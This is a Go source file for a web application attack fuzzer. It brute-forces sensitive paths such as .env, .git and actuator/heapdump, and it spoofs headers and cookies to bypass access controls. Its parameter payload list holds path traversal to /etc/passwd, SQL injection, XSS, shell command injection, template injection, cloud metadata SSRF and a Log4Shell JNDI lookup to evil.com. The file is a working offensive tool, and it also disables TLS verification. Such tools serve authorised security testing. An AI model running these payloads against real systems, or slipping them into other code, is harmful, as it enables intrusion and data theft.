package fuzzer

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"
)

type Fuzzer struct {
	TargetURL   string
	Headers     map[string]string
	Client      *http.Client
	Wordlist    []string
	Results     []FuzzResult
	RateLimit   time.Duration
	MatchCodes  []int
	FilterCodes []int
	MatchSize   int
	FilterSize  int
	mu          sync.Mutex
}

type FuzzResult struct {
	URL          string
	Method       string
	Payload      string
	StatusCode   int
	ContentLen   int
	Words        int
	Lines        int
	ResponseTime time.Duration
	Redirect     string
	Headers      map[string]string
	Interesting  bool
	Evidence     string
}

func NewFuzzer(targetURL string) *Fuzzer {
	transport := &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:        100,
		MaxIdleConnsPerHost: 100,
		IdleConnTimeout:     30 * time.Second,
	}

	return &Fuzzer{
		TargetURL:   targetURL,
		Headers:     make(map[string]string),
		Client:      &http.Client{Transport: transport, Timeout: 10 * time.Second, CheckRedirect: func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse }},
		Wordlist:    make([]string, 0),
		Results:     make([]FuzzResult, 0),
		MatchCodes:  []int{200, 201, 204, 301, 302, 307, 401, 403, 405, 500},
		FilterCodes: []int{404},
	}
}

func (f *Fuzzer) DirectoryBruteforce(threads int) {
	commonDirs := []string{
		"admin", "administrator", "wp-admin", "login", "dashboard", "panel",
		"api", "v1", "v2", "graphql", "rest", "swagger", "docs", "doc",
		"backup", "backups", "bak", "old", "temp", "tmp", "test", "dev",
		"config", "conf", "settings", "setup", "install", "phpinfo",
		"uploads", "upload", "files", "images", "assets", "static", "media",
		".git", ".svn", ".env", ".htaccess", ".htpasswd", "web.config",
		"robots.txt", "sitemap.xml", "crossdomain.xml", "clientaccesspolicy.xml",
		"wp-content", "wp-includes", "xmlrpc.php", "wp-login.php",
		"phpmyadmin", "pma", "mysql", "adminer", "sql",
		"shell", "cmd", "terminal", "console", "debug",
		"server-status", "server-info", "status", "health", "metrics",
		"actuator", "actuator/health", "actuator/env", "actuator/heapdump",
		"trace", "env", "heapdump", "mappings", "beans", "configprops",
		".well-known", "security.txt", ".well-known/security.txt",
		"cgi-bin", "scripts", "bin", "includes", "inc",
		"private", "secret", "hidden", "internal", "staging",
	}

	if len(f.Wordlist) > 0 {
		commonDirs = append(commonDirs, f.Wordlist...)
	}

	f.fuzz(commonDirs, "FUZZ", threads)
}

func (f *Fuzzer) ParameterFuzz(endpoint string, params []string, threads int) {
	payloads := []string{
		"../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam",
		"{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
		"'", "\"", "'--", "\"--", "' OR '1'='1", "1' AND SLEEP(5)--",
		"<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
		"; id", "| id", "& id", "`id`", "$(id)",
		"${jndi:ldap://evil.com/a}", "${env:PATH}",
		"file:///etc/passwd", "http://169.254.169.254/",
		"null", "undefined", "NaN", "Infinity", "-1", "0", "999999999",
		"true", "false", "[]", "{}", "''", "\"\"",
		"%00", "%0a", "%0d", "%0d%0a", "%25", "%2e%2e%2f",
		"admin", "root", "test", "guest", "user",
	}

	for _, param := range params {
		urlWithPayloads := make([]string, len(payloads))
		for i, payload := range payloads {
			urlWithPayloads[i] = endpoint + "?" + param + "=" + url.QueryEscape(payload)
		}
		f.fuzzURLs(urlWithPayloads, threads)
	}
}

func (f *Fuzzer) HeaderFuzz(endpoint string, threads int) {
	headers := map[string][]string{
		"X-Forwarded-For":           {"127.0.0.1", "localhost", "192.168.1.1", "10.0.0.1", "::1"},
		"X-Real-IP":                 {"127.0.0.1", "localhost"},
		"X-Originating-IP":          {"127.0.0.1"},
		"X-Remote-IP":               {"127.0.0.1"},
		"X-Remote-Addr":             {"127.0.0.1"},
		"X-Forwarded-Host":          {"localhost", "evil.com"},
		"X-Host":                    {"localhost", "evil.com"},
		"X-Custom-IP-Authorization": {"127.0.0.1"},
		"X-Original-URL":            {"/admin", "/dashboard"},
		"X-Rewrite-URL":             {"/admin", "/dashboard"},
		"Host":                      {"localhost", "127.0.0.1"},
		"X-HTTP-Method-Override":    {"PUT", "DELETE", "PATCH"},
		"X-Method-Override":         {"PUT", "DELETE"},
		"Authorization":             {"Bearer null", "Basic YWRtaW46YWRtaW4="},
		"Cookie":                    {"admin=true", "role=admin", "debug=1"},
	}

	sem := make(chan struct{}, threads)
	var wg sync.WaitGroup

	for header, values := range headers {
		for _, value := range values {
			wg.Add(1)
			go func(h, v string) {
				defer wg.Done()
				sem <- struct{}{}
				defer func() { <-sem }()

				req, _ := http.NewRequest("GET", endpoint, nil)
				req.Header.Set(h, v)
				for k, val := range f.Headers {
					req.Header.Set(k, val)
				}

				start := time.Now()
				resp, err := f.Client.Do(req)
				latency := time.Since(start)

				if err != nil || resp == nil {
					return
				}

				body, _ := io.ReadAll(resp.Body)
				resp.Body.Close()

				if f.isInteresting(resp.StatusCode, len(body)) {
					f.addResult(FuzzResult{
						URL:          endpoint,
						Payload:      fmt.Sprintf("%s: %s", h, v),
						StatusCode:   resp.StatusCode,
						ContentLen:   len(body),
						ResponseTime: latency,
						Interesting:  true,
						Evidence:     "Header manipulation",
					})
					fmt.Printf("[+] Header: %s: %s -> %d\n", h, v, resp.StatusCode)
				}

				time.Sleep(f.RateLimit)
			}(header, value)
		}
	}

	wg.Wait()
}

func (f *Fuzzer) VHostFuzz(ip string, domains []string, threads int) {
	sem := make(chan struct{}, threads)
	var wg sync.WaitGroup

	for _, domain := range domains {
		wg.Add(1)
		go func(d string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			req, _ := http.NewRequest("GET", "http://"+ip, nil)
			req.Host = d

			start := time.Now()
			resp, err := f.Client.Do(req)
			latency := time.Since(start)

			if err != nil || resp == nil {
				return
			}

			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()

			if f.isInteresting(resp.StatusCode, len(body)) {
				f.addResult(FuzzResult{
					URL:          ip,
					Payload:      d,
					StatusCode:   resp.StatusCode,
					ContentLen:   len(body),
					ResponseTime: latency,
					Interesting:  true,
					Evidence:     "Virtual host discovered",
				})
				fmt.Printf("[+] VHost: %s -> %d (%d bytes)\n", d, resp.StatusCode, len(body))
			}

			time.Sleep(f.RateLimit)
		}(domain)
	}

	wg.Wait()
}

func (f *Fuzzer) ExtensionFuzz(basePath string, threads int) {
	extensions := []string{
		".php", ".asp", ".aspx", ".jsp", ".jspx", ".do", ".action",
		".html", ".htm", ".shtml", ".xhtml",
		".txt", ".log", ".md", ".json", ".xml", ".yaml", ".yml",
		".bak", ".backup", ".old", ".orig", ".save", ".swp", ".tmp",
		".zip", ".tar", ".gz", ".rar", ".7z",
		".sql", ".db", ".sqlite", ".mdb",
		".conf", ".config", ".cfg", ".ini", ".env",
		".sh", ".bash", ".pl", ".py", ".rb", ".cgi",
		".inc", ".include", ".tpl", ".template",
		"~", ".DS_Store", ".git", ".svn",
		".php~", ".php.bak", ".php.old", ".php.swp",
	}

	urls := make([]string, len(extensions))
	for i, ext := range extensions {
		urls[i] = f.TargetURL + basePath + ext
	}

	f.fuzzURLs(urls, threads)
}

func (f *Fuzzer) RecursiveFuzz(depth int, threads int) {
	discovered := make(map[string]bool)
	toFuzz := []string{""}

	for d := 0; d < depth; d++ {
		var newPaths []string

		for _, path := range toFuzz {
			if discovered[path] {
				continue
			}
			discovered[path] = true

			words := f.Wordlist
			if len(words) == 0 {
				words = []string{"admin", "api", "app", "assets", "backup", "config", "data", "files", "include", "lib", "private", "public", "src", "static", "uploads", "v1", "v2"}
			}

			for _, word := range words {
				testPath := path + "/" + word
				resp, _, latency := f.request("GET", f.TargetURL+testPath, nil)

				if resp != nil && f.isInteresting(resp.StatusCode, 0) {
					f.addResult(FuzzResult{
						URL:          f.TargetURL + testPath,
						StatusCode:   resp.StatusCode,
						ResponseTime: latency,
						Interesting:  true,
					})
					fmt.Printf("[+] Found: %s -> %d\n", testPath, resp.StatusCode)

					if resp.StatusCode == 200 || resp.StatusCode == 301 || resp.StatusCode == 302 {
						newPaths = append(newPaths, testPath)
					}
				}

				time.Sleep(f.RateLimit)
			}
		}

		toFuzz = newPaths
		if len(toFuzz) == 0 {
			break
		}
	}
}

func (f *Fuzzer) MutationFuzz(endpoint string, basePayload string, threads int) {
	mutations := f.generateMutations(basePayload)

	sem := make(chan struct{}, threads)
	var wg sync.WaitGroup

	for _, mutation := range mutations {
		wg.Add(1)
		go func(m string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			resp, body, latency := f.request("POST", endpoint, []byte(m))

			if resp != nil && f.isInteresting(resp.StatusCode, len(body)) {
				f.addResult(FuzzResult{
					URL:          endpoint,
					Payload:      m,
					StatusCode:   resp.StatusCode,
					ContentLen:   len(body),
					ResponseTime: latency,
					Interesting:  true,
				})
			}

			time.Sleep(f.RateLimit)
		}(mutation)
	}

	wg.Wait()
}

func (f *Fuzzer) generateMutations(payload string) []string {
	mutations := []string{payload}

	// Case mutations
	mutations = append(mutations, strings.ToUpper(payload))
	mutations = append(mutations, strings.ToLower(payload))
	mutations = append(mutations, strings.Title(payload))

	// Encoding mutations
	mutations = append(mutations, url.QueryEscape(payload))
	mutations = append(mutations, doubleURLEncode(payload))
	mutations = append(mutations, unicodeEncode(payload))

	// Padding mutations
	mutations = append(mutations, " "+payload)
	mutations = append(mutations, payload+" ")
	mutations = append(mutations, "\t"+payload)
	mutations = append(mutations, payload+"\n")
	mutations = append(mutations, payload+"\r\n")
	mutations = append(mutations, payload+"%00")

	// Duplication
	mutations = append(mutations, payload+payload)

	// Character insertion
	for _, c := range []string{"'", "\"", "<", ">", "`", "$", "{", "}", "|", "&", ";", "\\"} {
		mutations = append(mutations, c+payload)
		mutations = append(mutations, payload+c)
		mutations = append(mutations, c+payload+c)
	}

	// Random mutations
	for i := 0; i < 10; i++ {
		mutations = append(mutations, randomMutate(payload))
	}

	return mutations
}

func (f *Fuzzer) IntruderAttack(endpoint string, template string, payloads []string, threads int) {
	sem := make(chan struct{}, threads)
	var wg sync.WaitGroup

	for _, payload := range payloads {
		wg.Add(1)
		go func(p string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			finalPayload := strings.ReplaceAll(template, "§§", p)
			resp, body, latency := f.request("POST", endpoint, []byte(finalPayload))

			if resp != nil {
				f.addResult(FuzzResult{
					URL:          endpoint,
					Payload:      p,
					StatusCode:   resp.StatusCode,
					ContentLen:   len(body),
					Words:        len(strings.Fields(string(body))),
					Lines:        len(strings.Split(string(body), "\n")),
					ResponseTime: latency,
				})
			}

			time.Sleep(f.RateLimit)
		}(payload)
	}

	wg.Wait()
}

func (f *Fuzzer) SmartFuzz(endpoint string, sampleResponse []byte, threads int) {
	// Extract potential injection points from response
	patterns := []string{
		`"([^"]+)":\s*"([^"]*)"`, // JSON strings
		`name="([^"]+)"`,         // Form fields
		`id="([^"]+)"`,           // IDs
		`class="([^"]+)"`,        // Classes
		`href="([^"]+)"`,         // Links
		`src="([^"]+)"`,          // Sources
		`action="([^"]+)"`,       // Form actions
	}

	extractedParams := make(map[string]bool)

	for _, pattern := range patterns {
		re := regexp.MustCompile(pattern)
		matches := re.FindAllStringSubmatch(string(sampleResponse), -1)
		for _, match := range matches {
			if len(match) > 1 {
				extractedParams[match[1]] = true
			}
		}
	}

	var params []string
	for p := range extractedParams {
		params = append(params, p)
	}

	fmt.Printf("[*] Smart Fuzz: Found %d potential parameters\n", len(params))
	f.ParameterFuzz(endpoint, params, threads)
}

func (f *Fuzzer) fuzz(payloads []string, marker string, threads int) {
	sem := make(chan struct{}, threads)
	var wg sync.WaitGroup

	for _, payload := range payloads {
		wg.Add(1)
		go func(p string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			testURL := strings.ReplaceAll(f.TargetURL, marker, p)
			resp, body, latency := f.request("GET", testURL, nil)

			if resp != nil && f.isInteresting(resp.StatusCode, len(body)) {
				redirect := ""
				if loc := resp.Header.Get("Location"); loc != "" {
					redirect = loc
				}

				f.addResult(FuzzResult{
					URL:          testURL,
					Payload:      p,
					StatusCode:   resp.StatusCode,
					ContentLen:   len(body),
					Words:        len(strings.Fields(string(body))),
					Lines:        len(strings.Split(string(body), "\n")),
					ResponseTime: latency,
					Redirect:     redirect,
					Interesting:  true,
				})
				fmt.Printf("[+] %s -> %d (%d bytes)\n", p, resp.StatusCode, len(body))
			}

			time.Sleep(f.RateLimit)
		}(payload)
	}

	wg.Wait()
}

func (f *Fuzzer) fuzzURLs(urls []string, threads int) {
	sem := make(chan struct{}, threads)
	var wg sync.WaitGroup

	for _, u := range urls {
		wg.Add(1)
		go func(testURL string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			resp, body, latency := f.request("GET", testURL, nil)

			if resp != nil && f.isInteresting(resp.StatusCode, len(body)) {
				f.addResult(FuzzResult{
					URL:          testURL,
					StatusCode:   resp.StatusCode,
					ContentLen:   len(body),
					ResponseTime: latency,
					Interesting:  true,
				})
				fmt.Printf("[+] %s -> %d\n", testURL, resp.StatusCode)
			}

			time.Sleep(f.RateLimit)
		}(u)
	}

	wg.Wait()
}

func (f *Fuzzer) isInteresting(statusCode, size int) bool {
	for _, code := range f.FilterCodes {
		if statusCode == code {
			return false
		}
	}

	if f.FilterSize > 0 && size == f.FilterSize {
		return false
	}

	if len(f.MatchCodes) > 0 {
		for _, code := range f.MatchCodes {
			if statusCode == code {
				return true
			}
		}
		return false
	}

	return true
}

func (f *Fuzzer) request(method, targetURL string, body []byte) (*http.Response, []byte, time.Duration) {
	var reqBody io.Reader
	if body != nil {
		reqBody = bytes.NewBuffer(body)
	}

	req, err := http.NewRequest(method, targetURL, reqBody)
	if err != nil {
		return nil, nil, 0
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	for k, v := range f.Headers {
		req.Header.Set(k, v)
	}

	start := time.Now()
	resp, err := f.Client.Do(req)
	latency := time.Since(start)

	if err != nil {
		return nil, nil, latency
	}

	respBody, _ := io.ReadAll(resp.Body)
	resp.Body.Close()

	return resp, respBody, latency
}

func (f *Fuzzer) addResult(result FuzzResult) {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.Results = append(f.Results, result)
}

func (f *Fuzzer) GetResults() []FuzzResult {
	return f.Results
}

func (f *Fuzzer) ExportResults() string {
	data, _ := json.MarshalIndent(f.Results, "", "  ")
	return string(data)
}

func doubleURLEncode(s string) string {
	return url.QueryEscape(url.QueryEscape(s))
}

func unicodeEncode(s string) string {
	var result strings.Builder
	for _, r := range s {
		result.WriteString(fmt.Sprintf("\\u%04x", r))
	}
	return result.String()
}

func randomMutate(s string) string {
	if len(s) == 0 {
		return s
	}
	runes := []rune(s)
	pos := rand.Intn(len(runes))

	mutations := []func(rune) rune{
		func(r rune) rune { return r + 1 },
		func(r rune) rune { return r - 1 },
		func(r rune) rune {
			if r >= 'a' && r <= 'z' {
				return r - 32
			}
			return r
		},
	}

	runes[pos] = mutations[rand.Intn(len(mutations))](runes[pos])
	return string(runes)
}
